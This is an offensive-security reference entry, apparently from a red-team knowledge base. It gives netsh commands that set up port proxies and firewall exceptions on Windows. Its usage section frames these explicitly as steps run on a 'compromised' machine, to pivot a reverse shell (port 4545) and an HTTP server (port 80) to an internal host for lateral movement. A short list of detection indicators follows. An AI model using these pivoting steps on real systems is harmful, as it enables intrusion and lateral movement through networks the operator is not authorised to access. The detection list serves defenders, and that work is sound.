---
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - port-forwarding
  - netsh
  - pivoting
validated: true
---

# windows-netsh-port-forwarding-setup

## Code

```powershell
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110

# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
# Correctly open the port on the machine
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
```

## Description

This PowerShell script sets up complete port forwarding on a Windows host using netsh, including proxy rules and firewall exceptions. It demonstrates generic and specific examples for pivoting traffic, such as forwarding to RDP (3389) or custom ports like 4545 and 80.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| localaddress | Local IP to bind listener (optional, defaults to 0.0.0.0) | 10.1.1.110 |
| localport | Local port to listen on | 3340 |
| destaddress | Destination IP to forward to | 192.168.50.44 |
| destport | Destination port to forward to | 4545 |

## Usage

Execute this script in an elevated PowerShell session on the compromised Windows machine. Customize the specific lines (e.g., ports and IPs) for your target. After running, verify with 'netsh interface portproxy show all'. Use for lateral movement, e.g., connect to pivot_ip:4545 to reach internal 192.168.50.44:4545.

## Detection

- PowerShell script block logging capturing netsh invocations.
- Event logs for firewall rule changes (Event ID 2004/2006).
- Unusual portproxy entries via 'netsh interface portproxy show v4tov4 all'.
- Network traffic anomalies on forwarded ports.

## Related

- [[procedures/windows-netsh-port-forwarding]]
- [[commands/netsh-interface-portproxy-add-v4tov4]]
